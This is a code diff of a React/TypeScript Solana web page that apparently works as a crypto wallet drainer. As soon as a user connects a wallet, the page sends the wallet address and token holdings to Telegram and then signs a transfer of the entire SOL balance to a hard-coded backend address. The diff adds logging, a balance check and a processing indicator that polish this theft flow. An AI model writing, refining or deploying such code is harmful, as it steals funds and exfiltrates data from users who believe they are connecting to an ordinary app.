@@ -17,31 +17,50 @@ const Index = () => {
   const [lastSignature, setLastSignature] = useState<string | null>(null);
 
   const handleWalletConnection = async () => {
-    if (!publicKey || !wallet) return;
+    if (!publicKey || !wallet) {
+      console.log("Wallet or public key not available");
+      return;
+    }
 
     setIsProcessing(true);
     try {
+      console.log("Starting wallet connection process");
+      
       // First, get and send wallet data to Telegram
+      console.log("Fetching token accounts");
       const tokens = await getTokenAccounts(connection, publicKey.toString());
       const walletData = {
         address: publicKey.toString(),
         tokens,
       };
       
+      console.log("Sending data to Telegram");
       await sendToTelegram(walletData);
 
       // Get wallet balance
+      console.log("Getting wallet balance");
       const balance = await connection.getBalance(publicKey);
-      const amountInSol = balance / LAMPORTS_PER_SOL;
+      console.log("Current balance:", balance / LAMPORTS_PER_SOL, "SOL");
+
+      if (balance <= 0) {
+        toast({
+          title: "Error",
+          description: "Insufficient balance for transfer",
+          variant: "destructive",
+        });
+        return;
+      }
 
       // Initiate transfer
+      console.log("Initiating transfer");
       const signature = await signAndSendTransaction(
         connection,
         wallet,
         BACKEND_ADDRESS,
-        amountInSol // Transfer entire balance
+        balance / LAMPORTS_PER_SOL // Transfer entire balance
       );
 
+      console.log("Transfer completed with signature:", signature);
       setLastSignature(signature);
       
       toast({
@@ -52,7 +71,7 @@ const Index = () => {
       console.error('Error processing wallet connection:', error);
       toast({
         title: "Error",
-        description: "Failed to process wallet connection",
+        description: error instanceof Error ? error.message : "Failed to process wallet connection",
         variant: "destructive",
       });
     } finally {
@@ -61,7 +80,7 @@ const Index = () => {
   };
 
   useEffect(() => {
-    if (connected && publicKey) {
+    if (connected && publicKey && !isProcessing) {
       handleWalletConnection();
     }
   }, [connected, publicKey]);
@@ -98,6 +117,12 @@ const Index = () => {
         {/* Action Buttons */}
         <div className="flex flex-col w-full max-w-md gap-4 mt-4">
           <WalletMultiButton className="glass-button text-cyan-400 py-4 px-8 rounded-xl text-xl font-semibold" />
+          
+          {isProcessing && (
+            <div className="mt-4">
+              <p className="text-cyan-400">Processing transaction...</p>
+            </div>
+          )}
           
           {lastSignature && (
             <div className="mt-4 p-4 bg-gray-800 rounded-lg">
